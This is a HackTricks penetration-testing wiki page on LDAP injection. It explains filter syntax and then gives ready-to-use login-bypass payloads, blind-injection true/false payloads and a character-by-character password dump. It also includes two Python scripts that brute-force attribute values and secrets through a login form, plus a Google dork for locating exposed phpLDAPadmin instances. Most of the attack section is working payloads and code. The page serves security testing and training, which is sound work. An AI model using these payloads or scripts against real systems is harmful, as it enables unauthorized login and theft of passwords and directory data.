# LDAP Injection

## LDAP Injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## LDAP Injection

### **LDAP**

**If you want to know what is LDAP access the following page:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Injection** is an attack used to **exploit** **web** based applications that construct **LDAP** **statements** based on **user** **input**. When an application **fails** to properly **sanitize** user input, it's possible to modify LDAP statements using a local proxy.

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**Filter** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr ”=” \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = Absolute TRUE\
**(|)** = Absolute FALSE

For example:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

You can access to the database, and this can content information of a lot of different types.

**OpenLDAP**: If 2 filters arrive, only executes the first one.\
**ADAM or Microsoft LDS**: With 2 filters they throw an error.\
**SunOne Directory Server 5.0**: Execute both filters.

**It is very important to send the filter with correct syntax or an error will be thrown. It is better to send only 1 filter.**

The filter has to start with: `&` or `|`\
Example: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

Then: `(&(objectClass=`**`*)(ObjectClass=*))`** will be the first filter (the one executed).

### Login Bypass

LDAP supports several formats to store the password: clear, md5, smd5, sh1, sha, crypt. So, it could be that independently of what you insert inside the password, it is hashed.

```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```

#### Lists

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP Attributes](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [LDAP PosixAccount attributes](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### Blind LDAP Injection

You may force False or True responses to check if any data is returned and confirm a possible Blind LDAP Injection:

```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```

#### Dump data

You can iterate over the ascii letters, digits and symbols:

```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```

### Scripts

#### **Discover valid LDAP fields**

LDAP objects **contains by default several attributes** that could be used to **save information**. You can try to **brute-force all of them to extract that info.** You can find a list of [**default LDAP attributes here**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).

```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
    value = ""
    finish = False
    while not finish:
        for char in alphabet: #In each possition test each possible printable char
            query = f"*)({attribute}={value}{char}*"
            data = {'login':query, 'password':'bla'}
            r = requests.post(url, data=data, proxies=proxy)
            sys.stdout.write(f"\r{attribute}: {value}{char}")
            #sleep(0.5) #Avoid brute-force bans
            if "Cannot login" in r.text:
                value += str(char)
                break

            if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
                finish = True
                print()
```

#### **Special Blind LDAP Injection (without "\*")**

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

### Google Dorks

```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```

### More Payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
